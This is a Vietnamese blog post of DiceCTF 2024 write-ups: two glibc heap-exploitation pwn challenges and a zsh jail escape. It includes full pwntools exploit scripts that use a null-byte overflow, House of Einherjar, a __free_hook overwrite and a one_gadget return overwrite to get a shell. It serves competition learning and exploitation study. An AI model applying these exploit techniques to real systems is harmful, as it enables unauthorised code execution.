---
title: "DICE-CTF 2024 Writeups"
date: 2024-02-02T17:37:11+08:00
toc: true
description: DICE-CTF 2024 Quals Writeups 
tags: ["ctf", "pwn"]
draft: false
---

# Lời nói đầu

Tuần cuối cùng của năm 2023, mình quyết định kết thúc năm 2023 này với giải DiceCTF. Sau đây là writeups của 1 số bài mình làm được trong suốt giải.

# Pwn - babytalk

## Source code overview
- Đây là bài đầu tiên mình làm trong giải, và có vẻ là 1 challenge về Heap khá dễ thở.
- Challenge dưới dạng tệp ELF 64-bit, full-mitigations, có 4 chức năng 

```c
╭─    ~/CTF/Pwnable/2024/dicectf/baby-talk                                                                                                               ✔  w1n_gl0ry@phis1Ng ─╮
╰─ ./chall_patched                                                                                                                                                                  ─╯
1. str
2. tok
3. del
4. exit
> 
```

Thoạt nhìn qua 3 chức năng `do_str`, `do_tok`, `do_del` thì không thấy bug gì cả. Chúng ta có thể allocate qua malloc, strtok, free.

## Solution

```c
void do_tok(void) {
    printf("idx? ");
    unsigned long idx = get_num();
    if (idx >= ARR_SIZE) {
        puts("too big!");
        return;
    }
    char *str = strs[idx];
    if (str == NULL) {
        puts("empty!");
        return;
    }
    printf("delim? ");
    char delim[2];
    read(STDIN_FILENO, delim, sizeof(delim));
    delim[1] = '\0';
    for (char *tok = strtok(str, delim); tok != NULL; tok = strtok(NULL, delim)) {
        puts(tok);
    }
}
```
Hàm `strtok()` chia 1 string thành chuỗi NULL hoặc là 1 chuỗi token. Nếu tìm thấy delimiter byte đã được chỉ định, nó sẽ được ghi đè bởi NULL byte để kết thúc chuỗi.

`The strtok() function breaks a string into a sequence of zero or more nonempty tokens.  On the first call to strtok(), the string to be parsed should be specified in str.  In each subsequent call that should parse the same string, str must be NULL.`

Ở hàm `do_str()`, khi cấp phát và nhập nội dung thì nó sẽ đọc chính xác số kí tự theo size đã được chỉ định và không kết thúc chuỗi bằng NULL byte.
Do đó, ta có thể lấp đầy heap.

![image](https://hackmd.io/_uploads/rJcByhPo6.png)

Bây giờ ta gọi hàm `do_tok()` và chỉ định delimiter byte là byte đầu tiên của trường size của chunk kế tiếp, ta sẽ trigger được null byte overflow.

![image](https://hackmd.io/_uploads/r12VeNuoT.png)



Đến đây, mình khá là tà đạo nên sẽ sử dụng kĩ thuật House of einherjar để ghi đè `__free_hook` và get shell.

## Solve Script

```python
from pwn import *

if args.LOCAL:
    io=process('./chall_patched')
    if args.GDB:
        cmd="""
        init-pwndbg
        """
        gdb.attach(io, cmd)
else: 
    io=remote('mc.ax', 32526)
    #io=remote('0', 1337)
libc=ELF('./libc-2.27.so')
elf=ELF('./chall_patched')

def str_(size, ll):
    io.sendlineafter(b'> ', b'1')
    io.sendafter(b'size? ', str(size).encode())
    if size:
        sleep(0.1)
        io.send(ll)
    
def tok(idx, delim):
    io.sendlineafter(b'> ', b'2')
    io.sendafter(b'idx? ', str(idx).encode())
    io.sendafter(b'delim? ', delim)
    
def del_(idx):
    io.sendlineafter(b'> ', b'3')
    io.sendafter(b'idx? ', str(idx).encode())
    
def exit_():
    io.sendlineafter(b'> ', b'4')

for i in range(2):
    str_(0, b'aa')

del_(0)
del_(1)

str_(0, b'a')
tok(0, b'\0')
heap = u64(io.recv(6)+b'\0\0') -  0x260
del_(0)
print(hex(heap))

str_(0x4f8, b'A')
str_(0x20, b'A')
del_(0)
str_(0x4f8, b'\x60')
tok(0, b'\0')
libc.address = u64(io.recv(6)+b'\0\0') - 0x3ebc60
print(hex(libc.address))
# del_(0)

str_(0x38, p64(0)+p64(0x60)+p64(heap+0x7d0)*2) # 2
str_(0x28, b'A'*0x28) # 3
str_(0xf8, b'B') # 4
tok(3, b'\x01')
del_(3)
str_(0x28, b'A'*0x20+p64(0x60)) # 3

for i in range(7):
    str_(0xf8, str(i).encode()) # 5 -> 12
str_(0x68, b'C') # 13
for i in range(7):
    del_(i+5)
    
del_(4) 
str_(0x158, b'test') 
del_(4)
del_(3)
str_(0x158, b'test'*10+p64(0x30)+p64(libc.sym.__free_hook)) 
str_(0x28, b'a') 
str_(0x28, p64(libc.sym.system))  
str_(0x100, b'/bin/sh')
del_(6)

io.interactive()

```

# Pwn - boogie-woogie

## Source code overview

```c
#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <stdbool.h>
#include <dlfcn.h>

// generate art.h with echo "const unsigned char __art[] = {$((ascii-image-converter ./aoi-todo.webp  --color --dither --braille --width 80; echo -ne "\x00") | xxd -i)};" > art.h
#include "art.h"

char data[] = {"Listen closely, cursed spirit. There is no way you do not know this. An arm is\nmerely a decoration. The act of applause is an acclamation of the soul!"};

void clap(size_t a, size_t b)
{
    data[a] ^= data[b];
    data[b] ^= data[a];
    data[a] ^= data[b];
}

// gcc main.c -o boogie-woogie
int main()
{
    // set line buffering. comment this to let libc decide when to buffer (based on pty)
    // setvbuf(dlsym(NULL, "stdout"), NULL, _IOLBF, 0);

    printf("%s\n", __art);
    printf("\x1b[0;33mEven this cursed spirit uses Black Flash. The one who is now being left behind\nis me. You’ve gotten strong, brother. Are you gonna just sit still, \x1b[4;33mAoi Todo\x1b[0;33m?!\nAre you gonna let your brother feel alone again, \x1b[4;33mAoi Todo\x1b[0;33m?!\x1b[0m\n\n");
    while (data[0])
    {
        size_t a, b = 0;
        printf("\n\x1b[31;49;1;4m%s\x1b[0m\n\n\n", data);

        printf("The sound of \x1b[0;33mgion shoja bells\x1b[0m echoes the impermanence of all things. The color\nof \x1b[0;33msala flowers\x1b[0m reveals the truth that the prosperous must decline. \x1b[4;33mHowever\x1b[0m! We\nare the exception:\n");
        scanf("%zu %zu", &a, &b);
        clap(a, b);
    }
}
```

Chương trình nhìn có vẻ đơn giản, nhận 2 số làm input, swap 2 kí tự ở mảng toàn cục `data` và sẽ in ra mảng đó sau khi swap.

Không có đoạn code nào check input của ta nên dễ thấy OOB xuất hiện và từ đó có thể swap byte với mọi phân vùng `rw*` trong binary.

## Solution

### Leak PIE

[__dso_handle](https://wiki.osdev.org/C%2B%2B#GCC) ?

Nó được đưa vào tham số thứ 3 của hàm `__cxa_atexit` và được dùng để xác định dynamic shared objects trong quá trình hủy đối tượng toàn cục (thông thường là ở quá trình kết thúc chương trình)

`int __cxa_atexit(void (*destructor) (void *), void *arg, void *__dso_handle);`

Nhìn vào đoạn code dưới đây, khi mà ta thay đổi giá trị của `__dso_handle` thì không có ý nghĩa trong việc khai thác lắm

[stdlib/cxa_finalize.c](https://elixir.bootlin.com/glibc/glibc-2.35/source/stdlib/cxa_finalize.c)
```c
#include <assert.h>
#include <stdlib.h>
#include "exit.h"
#include <register-atfork.h>
#include <sysdep.h>
#include <stdint.h>

/* If D is non-NULL, call all functions registered with `__cxa_atexit'
   with the same dso handle.  Otherwise, if D is NULL, call all of the
   registered handlers.  */
void
__cxa_finalize (void *d)
{
  struct exit_function_list *funcs;

  __libc_lock_lock (__exit_funcs_lock);

 restart:
  for (funcs = __exit_funcs; funcs; funcs = funcs->next)
    {
      struct exit_function *f;

      for (f = &funcs->fns[funcs->idx - 1]; f >= &funcs->fns[0]; --f)
	if ((d == NULL || d == f->func.cxa.dso_handle) && f->flavor == ef_cxa)
	  {
	    const uint64_t check = __new_exitfn_called;
	    void (*cxafn) (void *arg, int status) = f->func.cxa.fn;
	    void *cxaarg = f->func.cxa.arg;

	    /* We don't want to run this cleanup more than once.  The Itanium
	       C++ ABI requires that multiple calls to __cxa_finalize not
	       result in calling termination functions more than once.  One
	       potential scenario where that could happen is with a concurrent
	       dlclose and exit, where the running dlclose must at some point
	       release the list lock, an exiting thread may acquire it, and
	       without setting flavor to ef_free, might re-run this destructor
	       which could result in undefined behaviour.  Therefore we must
	       set flavor to ef_free to avoid calling this destructor again.
	       Note that the concurrent exit must also take the dynamic loader
	       lock (for library finalizer processing) and therefore will
	       block while dlclose completes the processing of any in-progress
	       exit functions. Lastly, once we release the list lock for the
	       entry marked ef_free, we must not read from that entry again
	       since it may have been reused by the time we take the list lock
	       again.  Lastly the detection of new registered exit functions is
	       based on a monotonically incrementing counter, and there is an
	       ABA if between the unlock to run the exit function and the
	       re-lock after completion the user registers 2^64 exit functions,
	       the implementation will not detect this and continue without
	       executing any more functions.

	       One minor issue remains: A registered exit function that is in
	       progress by a call to dlclose() may not completely finish before
	       the next registered exit function is run. This may, according to
	       some readings of POSIX violate the requirement that functions
	       run in effective LIFO order.  This should probably be fixed in a
	       future implementation to ensure the functions do not run in
	       parallel.  */
	    f->flavor = ef_free;

#ifdef PTR_DEMANGLE
	    PTR_DEMANGLE (cxafn);
#endif
	    /* Unlock the list while we call a foreign function.  */
	    __libc_lock_unlock (__exit_funcs_lock);
	    cxafn (cxaarg, 0);
	    __libc_lock_lock (__exit_funcs_lock);

	    /* It is possible that that last exit function registered
	       more exit functions.  Start the loop over.  */
	    if (__glibc_unlikely (check != __new_exitfn_called))
	      goto restart;
	  }
    }

  /* Also remove the quick_exit handlers, but do not call them.  */
  for (funcs = __quick_exit_funcs; funcs; funcs = funcs->next)
    {
      struct exit_function *f;

      for (f = &funcs->fns[funcs->idx - 1]; f >= &funcs->fns[0]; --f)
	if (d == NULL || d == f->func.cxa.dso_handle)
	  f->flavor = ef_free;
    }

  /* Remove the registered fork handlers.  We do not have to
     unregister anything if the program is going to terminate anyway.  */
  if (d != NULL)
    UNREGISTER_ATFORK (d);
  __libc_lock_unlock (__exit_funcs_lock);
}
```


Tuy nhiên, có 1 điều chú ý ở đây là nó trỏ đến chính địa chỉ của nó trong phân vùng .bss, từ đây ta có thể dễ dàng leak được PIE.

```
pwndbg> tel &__dso_handle
00:0000│  0x555555563008 (__dso_handle) ◂— 0x555555563008
```

### Leak HEAP

```c
╭─    ~/CTF/Pwnable/2024/dicectf/boogie-woogie                                                                                        ✔  w1n_gl0ry@phis1Ng ─╮
╰─ cat /proc/155341/maps                                                                                                                                         ─╯
56330ee12000-56330ee13000 r--p 00000000 08:02 1344433                    /home/w1n_gl0ry/CTF/Pwnable/2024/dicectf/boogie-woogie/boogie-woogie_patched
56330ee13000-56330ee14000 r-xp 00001000 08:02 1344433                    /home/w1n_gl0ry/CTF/Pwnable/2024/dicectf/boogie-woogie/boogie-woogie_patched
56330ee14000-56330ee20000 r--p 00002000 08:02 1344433                    /home/w1n_gl0ry/CTF/Pwnable/2024/dicectf/boogie-woogie/boogie-woogie_patched
56330ee20000-56330ee21000 r--p 0000d000 08:02 1344433                    /home/w1n_gl0ry/CTF/Pwnable/2024/dicectf/boogie-woogie/boogie-woogie_patched
56330ee21000-56330ee23000 rw-p 0000e000 08:02 1344433                    /home/w1n_gl0ry/CTF/Pwnable/2024/dicectf/boogie-woogie/boogie-woogie_patched
5633107ab000-5633107cc000 rw-p 00000000 00:00 0                          [heap]
7f835b000000-7f835b028000 r--p 00000000 08:02 1344431                    /home/w1n_gl0ry/CTF/Pwnable/2024/dicectf/boogie-woogie/libc.so.6
7f835b028000-7f835b1bd000 r-xp 00028000 08:02 1344431                    /home/w1n_gl0ry/CTF/Pwnable/2024/dicectf/boogie-woogie/libc.so.6
7f835b1bd000-7f835b215000 r--p 001bd000 08:02 1344431                    /home/w1n_gl0ry/CTF/Pwnable/2024/dicectf/boogie-woogie/libc.so.6
7f835b215000-7f835b216000 ---p 00215000 08:02 1344431                    /home/w1n_gl0ry/CTF/Pwnable/2024/dicectf/boogie-woogie/libc.so.6
7f835b216000-7f835b21a000 r--p 00215000 08:02 1344431                    /home/w1n_gl0ry/CTF/Pwnable/2024/dicectf/boogie-woogie/libc.so.6
7f835b21a000-7f835b21c000 rw-p 00219000 08:02 1344431                    /home/w1n_gl0ry/CTF/Pwnable/2024/dicectf/boogie-woogie/libc.so.6
7f835b21c000-7f835b229000 rw-p 00000000 00:00 0 
7f835b2ce000-7f835b2d3000 rw-p 00000000 00:00 0 
7f835b2d3000-7f835b2d5000 r--p 00000000 08:02 1344432                    /home/w1n_gl0ry/CTF/Pwnable/2024/dicectf/boogie-woogie/ld-2.35.so
7f835b2d5000-7f835b2ff000 r-xp 00002000 08:02 1344432                    /home/w1n_gl0ry/CTF/Pwnable/2024/dicectf/boogie-woogie/ld-2.35.so
7f835b2ff000-7f835b30a000 r--p 0002c000 08:02 1344432                    /home/w1n_gl0ry/CTF/Pwnable/2024/dicectf/boogie-woogie/ld-2.35.so
7f835b30b000-7f835b30d000 r--p 00037000 08:02 1344432                    /home/w1n_gl0ry/CTF/Pwnable/2024/dicectf/boogie-woogie/ld-2.35.so
7f835b30d000-7f835b30f000 rw-p 00039000 08:02 1344432                    /home/w1n_gl0ry/CTF/Pwnable/2024/dicectf/boogie-woogie/ld-2.35.so
7ffc7b917000-7ffc7b938000 rw-p 00000000 00:00 0                          [stack]
7ffc7b947000-7ffc7b94b000 r--p 00000000 00:00 0                          [vvar]
7ffc7b94b000-7ffc7b94d000 r-xp 00000000 00:00 0                          [vdso]
ffffffffff600000-ffffffffff601000 --xp 00000000 00:00 0                  [vsyscall]
```

Nhận thấy offset giữa vùng data và vùng heap bị ảnh hưởng bởi ASLR nên không cố định.

[source/arch/x86/kernel/process.c](https://elixir.bootlin.com/linux/latest/source/arch/x86/kernel/process.c)
```c
unsigned long arch_randomize_brk(struct mm_struct *mm)
{
	return randomize_page(mm->brk, 0x02000000);
}
```

Nhìn vào source trên, địa chỉ của Heap sẽ bắt đầu từ 0 -> 0x02000000 (dài khoảng 8192 pages) tính từ địa chỉ kết thúc của program (bằng 0 nếu binary không có cơ chế ASLR), mà địa chỉ Heap trải dài khoảng 33 pages (dài 0x21000). Do đó ta có thể brute tương đương 1/249 lần (33/8192) để có thể xác định được 1 địa chỉ hợp lệ ở phân vùng Heap, từ đó ta có thể xác định được địa chỉ Heap base bằng cách kiểm tra byte cuối của `top chunk` hoặc `tcache_perthread_struct` size field.

### Leak LIBC

Leak libc từ 1 chunk được đưa vào unsorted bin nhờ AAR là điều mà ta thường hay làm, nhưng ở bài này thì không đơn giản như vậy. Ta có thể allocate 1 chunk lớn thông qua hàm `scanf` nhưng sau khi kết thúc hàm scanf nó sẽ free và consolidate với top-chunk nên ta sẽ không thể leak được. 

Ta có thể ghi đè size của top-chunk:

* Khi mà size của top-chunk không đủ lớn để phân bổ, nó sẽ gọi đến [sysmalloc](https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#L2547) để phân bổ vùng heap mới và sẽ gọi đến [_int_free](https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#L4420) để free top-chunk cũ nếu thõa mãn các điều kiện dưới đây

```c
assert ((old_top == initial_top (av) && old_size == 0) ||
  ((unsigned long) (old_size) >= MINSIZE &&
   prev_inuse (old_top) &&
   ((unsigned long) old_end & (pagesize - 1)) == 0));
assert ((unsigned long) (old_size) < (unsigned long) (nb + MINSIZE));
```

* Vậy nếu chỉnh sửa byte thứ 3 của top-chunk thành null-byte rồi cấp phát 1 chunk cực lớn thông qua hàm `scanf` là chúng ta đã có thể đưa top-chunk vào unsorted-bin.


```python
pwndbg> bins
tcachebins
empty
fastbins
empty
unsortedbin
all: 0x562a15d01ab0 —▸ 0x7f55a46a1ce0 ◂— 0x562a15d01ab0
smallbins
empty
largebins
empty
```

### Get SHELL

Bây giờ ta đã có AAW với địa chỉ libc vừa được leak, đơn giản ta sẽ leak stack thông qua `__libc_envrion` rồi ghi đè `return address` về `one_gadget` .

## Solve Script

```python
from pwn import *
import os

libc = ELF("./libc.so.6")
elf = context.binary = ELF("./boogie-woogie_patched")
# context.log_level = 'debug'

def connect():
    if args.LOCAL:
        return process('./boogie-woogie_patched')
    elif args.DOCKER:
        return remote('0', 1337)
        
def clap_str(num1, num2):
    io.sendline(num1.encode() + b' ' + num2.encode())
def clap(v1,v2):
    io.sendline((str(v1)+' '+str(v2)).encode())

def aar(addr):
    for i in range(8):
        clap(addr+i, 1+i)

    for _ in range(8):
        io.readuntil(b"exception:")
    io.recvuntil(b"4m")
    io.recvuntil(b"L")
    ptr = u64(io.recv(6).ljust(8,b"\x00"))
    for i in range(8):
        io.sendline(f"{addr+i} {1+i}".encode())

    for _ in range(8):
        io.recvuntil(b"exception:")
    return ptr

def aaw(addr1, addr2, len):
    for i in range(len):
        clap(addr1+i-elf.sym['data'], addr2+i-elf.sym['data'])
    
def brute_heap_offset():
    idx = 0
    with log.progress('Bruting') as p:
        while True:
            try:
                idx += 1
                p.status("attempt %i", idx)
                io = connect()
                io.recvuntil(b"exception")
                trial_heap_offset = 0x1995fe0
            
                io.sendline(f"1 {trial_heap_offset}".encode())
                
                io.recvuntil(b"exception")
                io.sendline(f"1 {trial_heap_offset}".encode())
                p.success()
                return (io, trial_heap_offset >> 12 << 12)
            except EOFError:
                with context.local(log_level='error'): io.close()

io, heap_page = brute_heap_offset()

__dso_handle = aar(-24)
elf.address =  __dso_handle - elf.symbols['__dso_handle']

log.info('pie ' + hex(elf.address))

tcache_perthread_struct = heap_page + 8 - 0x20

io.recvuntil(b"exception:")

while True:
    io.sendline(f"1 {tcache_perthread_struct}".encode())
    io.recvuntil(b"L")
    if io.recv(1) == b'\x91':
        io.recvuntil(b"exception:")
        break
    io.recvuntil(b"exception:")
    tcache_perthread_struct -= 0x1000
    
heap = tcache_perthread_struct - 0x8
top_chunk = heap + 0x0ab8
log.info('heap ' + hex(heap))
log.info('top_chunk ' + hex(top_chunk))

io.sendline(f"-3 {top_chunk+2}".encode())
io.sendline(b"-1 -"+b"1"*0x800)

# cmd = """
# init-pwndbg
# b* main+199
# """
# gdb.attach(io, cmd)

libc.address = aar(top_chunk+8) - 0x21ace0

io.sendline(f"1 {top_chunk+8+6}".encode())

log.info('libc ' + hex(libc.address))

og_offset = [0x50a47, 0xebc81, 0xebc88, 0xebc85]

stack = aar(libc.sym.__environ - elf.sym['data']) - 0x21ace0
ret = stack - 0x120
rbp = ret-8
log.info('stack ' + hex(stack))
log.info('ret ' + hex(ret))

with open("libc_bss", "rb") as f:
    data = bytearray(f.read())

## Overwrite rbp with stack address in libc_environ
aaw(rbp, libc.sym.__environ, 8)

def get_byte(addr, nth):
    return ((addr >> 8*nth) & 0xff).encode()
og = libc.address + og_offset[2]

aaw(libc.bss()+data.find(get_byte(og, 0)), ret, 1)
aaw(libc.bss()+data.find(get_byte(og, 1)), ret+1, 1)
aaw(libc.bss()+data.find(get_byte(og, 2)), ret+2, 1)

clap(0, 0) # win
io.interactive()
```

Ở bài này, vì có write primitive ở libc 2.35 khá là mạnh nên mọi người có thể làm nhiều cách khác nhau, mọi người có thể tham khảo ở [bài viết này](https://github.com/nobodyisnobody/docs/tree/main/code.execution.on.last.libc)

# Misc - zshfuck

## Source code overview

```sh
#!/bin/zsh
print -n -P "%F{green}Specify your charset: %f"
read -r charset
# get uniq characters in charset
charset=("${(us..)charset}")
banned=('*' '?' '`')

if [[ ${#charset} -gt 6 || ${#charset:|banned} -ne ${#charset} ]]; then
    print -P "\n%F{red}That's too easy. Sorry.%f\n"
    exit 1
fi
print -P "\n%F{green}OK! Got $charset.%f"
charset+=($'\n')

# start jail via coproc
coproc zsh -s
exec 3>&p 4<&p

# read chars from fd 4 (jail stdout), print to stdout
while IFS= read -u4 -r -k1 char; do
    print -u1 -n -- "$char"
done &
# read chars from stdin, send to jail stdin if valid
while IFS= read -u0 -r -k1 char; do
    if [[ ! ${#char:|charset} -eq 0 ]]; then
        print -P "\n%F{red}Nope.%f\n"
        exit 1
    fi
    # send to fd 3 (jail stdin)
    print -u3 -n -- "$char"
done

```

## Solution

Đọc sơ qua thì dường như đây là 1 bài escape jail. Khi mà ta được define 6 kí tự (ngoài  *, ?, \`) và sẽ thực thi được command chỉ sử dụng những kí tự mà ta đã define. Vì absolute path của binary `getflag` khá là dài nên mình sẽ dùng command `find .`
```c
╭─    ~/CTF/Pwnable/2024/dicectf/boogie-woogie                                                                                                           ✔  w1n_gl0ry@phis1Ng ─╮
╰─ nc mc.ax 31774                                                                                                                                                                   ─╯
Specify your charset: find .

OK! Got f i n d   ..
find .
.
./y0u
./y0u/w1ll
./y0u/w1ll/n3v3r_g3t
./y0u/w1ll/n3v3r_g3t/th1s
./y0u/w1ll/n3v3r_g3t/th1s/getflag
./run
```

Bây giờ, để thực thi được `./y0u/w1ll/n3v3r_g3t/th1s/getflag` với số kí tự ít ỏi như vậy khá là khoai. Sau 1 hồi, mình tìm thấy tài liệu liên quan đến [zsh](https://zsh.sourceforge.io/Doc/Release/Expansion.html#Glob-Operators) và chỉ cần define đúng 5 kí tự `./[!]` .

## Final Payload

![image](https://hackmd.io/_uploads/rJGO1nvop.png)


# Reference

[https://github.com/shellphish/how2heap/blob/master/glibc_2.27/house_of_einherjar.c](https://github.com/shellphish/how2heap/blob/master/glibc_2.27/house_of_einherjar.c)

[https://wiki.osdev.org/C%2B%2B#GCC](https://wiki.osdev.org/C%2B%2B#GCC)

[https://elixir.bootlin.com/glibc/glibc-2.35/source/stdlib/cxa_finalize.c](https://elixir.bootlin.com/glibc/glibc-2.35/source/stdlib/cxa_finalize.c)

[https://elixir.bootlin.com/linux/latest/source/arch/x86/kernel/process.c](https://elixir.bootlin.com/linux/latest/source/arch/x86/kernel/process.c)

[https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#L2547](https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#L2547)

[https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#L4420](https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#L4420)

[https://zsh.sourceforge.io/Doc/Release/Expansion.html#Glob-Operators](https://zsh.sourceforge.io/Doc/Release/Expansion.html#Glob-Operators)




